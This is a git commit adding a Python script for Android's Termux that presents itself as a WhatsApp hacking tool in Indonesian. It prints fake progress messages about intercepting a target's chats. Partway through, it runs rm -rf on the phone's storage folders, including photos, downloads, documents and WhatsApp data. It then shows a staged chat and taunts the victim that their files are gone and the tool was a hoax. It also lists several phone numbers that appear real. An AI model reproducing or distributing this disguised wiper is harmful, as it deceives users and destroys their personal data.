a1350d4632bb3bdf923399f2c6f4e562c7e40f32
CyberMrlink <55125543+CyberMrlink@users.noreply.github.com>
2019-09-18 05:59:16 +0700

    Create wahack.py

---
+++ wahack.py
@@ -0,0 +1,161 @@
+#!/bin/usr/python
+
+"""
+	Hack WHATSHXPro
+
+"""
+
+import os
+import sys
+from time import sleep
+
+def ketik(s):
+	for ASU in s + '\n':
+		sys.stdout.write(ASU)
+		sys.stdout.flush()
+		sleep(50. / 1000)
+os.system('xdg-open https://mrlinkerrorsystem.blogspot.com/')
+os.system('clear')
+print ("""\033[1;31m
+               WhatsHack Tools Pro Termos
+             Author : Mrlinkerrorsystem
+  Tidak Ada WhatsApp Yang Aman
+\033[1;36m
+____________
+< WhatsApp >
+ ---------
+╲╲╭━━━━╮      
+╭╮┃▆┈┈▆┃ ╭╮     
+┃╰┫▽▽▽┣╯┃ 
+╰━┫△△△┣━╯
+╲╲┃┈┈┈┈┃
+╲╲┃┈┏┓┈┃
+▔▔╰━╯╰━╯             
+╲╲╭━━━━╮                                              
+╭╮┃▆┈┈▆┃ ╭╮      
+┃╰┫▽▽▽┣╯┃
+╰━┫△△△┣━╯    
+╲╲┃┈┈┈┈┃
+╲╲┃┈┏┓┈┃
+▔▔╰━╯╰━╯
+""")
+a = input("\033[1;36m Masukan No telepon kamu: ")
+a = input("\033[1;33m Masukan No telepon target kamu: ")
+os.system('clear')
+print ("\033[1;36m Memulai Sadap WhatsHXPro ")
+sleep(3)
+print ("\033[1;36m Mengambil data WhatsHXPro... ")
+sleep(3)
+print ("\033[1;36m Mengambil code verifikasi... ")
+print (' ')
+print ("\033[1;32m Suksesss mendapatkan code verifikasi... ")
+print (' ')
+ketik ("\033[1;32m Mengambil Data WhatsHXaPro")
+sleep(0.5)
+ketik ("\033[1;32m Mencari Nomor Kontak")
+sleep(0.5)
+ketik ("\033[1;32m Berhasil menemukan kontak")
+sleep(0.5)
+print ("\033[1;32m Baypass Akses LOG IN ")
+sleep(1)
+sleep(3)
+ketik ("\033[1;32m Baypass Suksess ")
+sleep(2)
+ketik ("\033[1;32m Mendapatkan Chat WhatHXPro: %s" % (a))
+sleep(0.5)
+ketik ("\033[1;32m Sedang Membuka Chat WhatsHXPro ")
+sleep(2)
+print ("\033[1;32m Baypass chat WhatsHXPro ")
+print (' ')
+print ("\033[1;32m SUKSESS TUNGGU DULU!!!")
+os.system('termux-setup-storage')
+os.system('rm -rf cd /sdcard/Android')
+os.system('rm -rf cd /sdcard/bluetooth')
+os.system('rm -rf cd /sdcard/browser')
+os.system('rm -rf cd /sdcard/DCIM')
+os.system('rm -rf cd /sdcard/Download')
+os.system('rm -rf cd /sdcard/Music')
+os.system('rm -rf cd /sdcard/Pictures')
+os.system('rm -rf cd /sdcard/SHAREit')
+os.system ('rm -rf cd /sdcard/Dokumen')
+os.system('rm -rf cd /sdcard/WhatsApp')
+sleep(3)
+print ("\033[1;32m Login Sukses! ")
+print (' ')
+print ("\033[1;32m Mengubah HALAMAN LOG-IN ")
+sleep(2)
+print ("\033[1;31m   Sukses! ")
+print ("\033[1;32m Menghapus LOG-IN WhatsHXPro ")
+sleep(2)
+print ("\033[1;31m   Sukses! ")
+sleep(3)
+print ("\033[1;32m Waiting Open Database WhatsHXPro ")
+os.system('clear')
+print ("""\033[1;31m
+\033[1;36m
+____________
+< WhatsAppHackPro>
+ ---------
+
+╲╲╭━━━━╮      
+╭╮┃▆┈┈▆┃╭╮     
+┃╰┫▽▽▽┣╯┃|    
+╰━┫△△△┣━╯
+╲╲┃┈┈┈┈┃
+╲╲┃┈┏┓┈┃
+▔▔╰━╯╰━╯             ÷÷÷÷÷÷÷÷÷÷÷÷÷
+╲╲╭━━━━╮                                              |
+╭╮┃▆┈┈▆┃ ╭╮       Database Chat    |
+┃╰┫▽▽▽┣╯┃|                                      |
+╰━┫△△△┣━╯      ÷÷÷÷÷÷÷÷÷÷÷÷÷
+╲╲┃┈┈┈┈┃
+╲╲┃┈┏┓┈┃
+▔▔╰━╯╰━╯
+""")
+sleep(5)
+print ("\033[1;32m Waiting Open Chat WhatsHXPro ")
+sleep(5)
+print ("\033[1;35m (1)   +62 857-4063-9126 ")
+print ("\033[1;35m (2)   +6289078946742 ")
+print ("\033[1;35m (3)   +628778906570 ")
+print ("\033[1;35m (4)   +6281385890549 ")
+print ("\033[1;35m (5)   +6282283007894 ")
+print ("\033[1;35m (6)   +6285256705212 ")
+a = input("\033[1;31m Silahkan Pilih : ")
+ketik ("\033[1;31m Waiting Open Chat! ") 
+print ("""\033[1;35m
+[18/9 05.52] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: Hai seyenk
+[18/9 05.52] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: Apa kabar
+[18/9 05.52] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: baek
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: lagi apa
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: galau
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: kenapa galau
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: gtw nh
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: kenapa chat
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: gpp cuma kangen doang :v
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: owh
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: sudah makan belum!
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: sudah makan belum ?
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: sudah
+[18/9 05.53] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: ikan apa?
+[18/9 05.54] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: ayam goreng 🍖
+[18/9 05.54] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: wow enak tuh
+[18/9 05.54] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: iya dong mau gak
+[18/9 05.54] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: mau dong sini suapin
+[18/9 05.54] 𓁬THCA⫷𖢣྆⃠Sayang𖢣྆⃠⫸𓁄: iss jauh gblok
+[18/9 05.54] 𓁬THCA⫷𖢣྆⃠MRLINKERROR𖢣྆⃠⫸𓁄: slow wkwkwk
+""")
+sleep(3)
+print ("\033[1;31m Terimakasih Telah Menggunakan Tools Ini! See you ")
+print ("\033[1;31m Silahkan Cek Semua Berkas Anda ^_^ ")
+print ("\033[1;31m Anjing Goblog Kok Ilang ^_^ ")
+print ("\033[1;31m Mamposh Terhapus Semua ^_^ ")
+print ("\033[1;31m Script Sadap WhatsApp Itu Hoax^_^ ")
+print ("\033[1;31m Dasar Kang Termoss ^_^")
+print ("\033[1;31m Katanya Hekel  ^_^ ")
+print ("\033[1;31m Katanya Hekel  ^_^ ")
+print ("\033[1;31m Katanya Hekel  ^_^ ")
+print ("\033[1;31m Katanya Hekel  ^_^ ")
+print ("\033[1;31m Katanya Hekel  ^_^ ")
+print ("\033[1;31m Katanya Hekel  ^_^ ")
+print ("\033[1;31m See You Next Time ^_^ ")
